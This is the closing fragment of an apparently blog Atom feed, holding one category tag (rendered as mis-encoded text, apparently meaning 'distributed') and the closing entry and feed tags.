      <category term="åˆ†å¸ƒå¼" scheme="http://www.r4v3zn.com/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
</feed>
